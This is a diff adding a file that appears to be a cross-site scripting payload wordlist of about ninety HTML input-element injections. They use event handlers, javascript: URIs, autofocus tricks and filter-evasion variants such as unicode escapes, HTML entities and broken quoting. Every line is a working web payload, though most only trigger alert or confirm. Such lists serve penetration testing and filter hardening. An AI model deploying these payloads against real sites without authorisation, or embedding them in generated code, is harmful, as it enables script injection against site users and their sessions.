@@ -1,0 +1,93 @@
+<input autofocus onblur=alert(1)>
+<input autofocus onblur=alert(150)>
+<input autofocus onfocus=alert(1)>
+<input autofocus onfocusin=alert(1)>
+<input draggable="true" ondrag="alert(1)">test</input>
+<input draggable="true" ondragend="alert(1)">test</input>
+<input draggable="true" ondragenter="alert(1)">test</input>
+<input draggable="true" ondragleave="alert(1)">test</input>
+<input draggable="true" ondragstart="alert(1)">test</input>
+<input id=x onfocus=alert(1)>
+<input id=x onfocusin=alert(1)>
+<input id=x tabindex=1 onactivate=alert(1)></input>
+<input id=x tabindex=1 onbeforeactivate=alert(1)></input>
+<input id=x tabindex=1 onbeforedeactivate=alert(1)></input><input autofocus>
+<input id=x tabindex=1 ondeactivate=alert(1)></input><input id=y autofocus>
+INPUT Image
+<input name="injected" value="injected" dirname="password" />
+<input name="password" type="password" value="secret" />
+<input name="secret" type="password">
+<input name="username" value="admin" />
+<input onauxclick=alert(1)>
+<input onbeforecopy=alert(1) value="XSS" autofocus>
+<input onbeforecut=alert(1) value="XSS" autofocus>
+<input onbeforepaste=alert(1) value="" autofocus>
+<input onblur=alert(1) id=x><input autofocus>
+<input onblur=javascript:alert(1478) autofocus><input autofocus>
+<input onblur=javascript:alert(1) autofocus><input autofocus>
+<input onblur=javascript:alert(564) autofocus><input autofocus>
+<input onblur=write(XSS) autofocus><input autofocus>
+<input onchange=alert(1) value=xss>
+<input onclick="alert(1)">test</input>
+<input oncontextmenu="alert(1)">test</input>
+<input oncopy=alert(1) value="XSS" autofocus>
+<input oncut=alert(1) value="XSS" autofocus>
+<input ondblclick="alert(1)">test</input>
+<input onfocus=alert(1337) </autofocus>
+<input onfocus=javascript:alert(1477) autofocus>
+<input onfocus=javascript:alert(1) autofocus>
+<input onfocus=javascript:alert(563) autofocus>
+<input onfocusout=alert(1) id=x><input autofocus>
+<InpuT/**/onfocus=pr\u006fmpt(1)%0Aautofocus>xss
+<input onfocus=write(XSS) autofocus>
+<input oninput=alert(1) value=xss>
+<input onkeydown="alert(1)" contenteditable>test</input>
+<input onkeypress="alert(1)" contenteditable>test</input>
+<input onkeyup="alert(1)" contenteditable>test</input>
+<input onmousedown="alert(1)">test</input>
+<input onmouseenter="alert(1)">test</input>
+<input onmouseleave="alert(1)">test</input>
+<input onmousemove="alert(1)">test</input>
+<input onmouseout="alert(1)">test</input>
+<input onmouseover="alert(1)">test</input>
+<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
+<input onmouseup="alert(1)">test</input>
+<input onpaste=alert(1) value="" autofocus>
+<input onselect=alert(1) value="XSS" autofocus>
+<INPUT TYPE="BUTTON" action="alert(1133)"/>
+<INPUT TYPE="BUTTON" action="alert('XSS')"/>
+<input type=checkbox id=x onfocus=alert(1)>
+<input type=checkbox id=x onfocusin=alert(1)>
+<input type="image" dynsrc="javascript:document.vulnerable=true;">
+<input type=image onloadend=alert(1) src=validimage.png>
+<input type=image onloadstart=alert(1) src=validimage.png>
+<input type=image src=1 onerror=alert(1)>
+<INPUT TYPE="IMAGE" SRC="javascript:alert(1018);">
+<INPUT TYPE="IMAGE" SRC="javascript:alert(1651);">
+<INPUT TYPE="IMAGE" SRC="javascript:alert(1769);">
+<INPUT TYPE="IMAGE" SRC="javascript:alert(1798);">
+<;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(1885);";>;
+<INPUT TYPE="IMAGE" SRC="javascript:alert(1967);">
+<INPUT TYPE="IMAGE" SRC="javascript:alert(737);">
+<INPUT TYPE=”IMAGE” SRC=”javascript:alert(851);”>
+<;INPUT TYPE=";IMAGE"; SRC=";javascript:alert(';XSS';);";>;
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>
+<input TYPE="IMAGE" SRC="javascript:document.vulnerable=true;">
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1);">
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(1585);">
+<INPUT TYPE="IMAGE" SRC="javascript:javascript:alert(671);">
+<input type=image src=validimage.png onload=alert(1)>
+<input type=radio id=x onfocus=alert(1)>
+<input type=radio id=x onfocusin=alert(1)>
+<input type="submit">
+<!'/!"/!\'/\"/--!><Input/Type=Text AutoFocus */; OnFocus=(confirm)(1) //>
+<input type="text" name="foo" value=""autofocus/onfocus=alert(1)//">
+<input type="text" value=`` <div/onmouseover='alert(1162)'>X</div>
+<input type="text" value=`` <div/onmouseover='alert(1699)'>X</div>
+<input type="text" value=`` <div/onmouseover='alert(1)'>X</div>
+<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
+<input type="text" value=`` <div/onmouseover='alert(785)'>X</div>
+<input type="text" value=`` <div/onmouseover='alert(824)'>X</div>
+<input value=<><iframe/src=javascript:confirm(1)
+<Input value = "XSS" type = text>
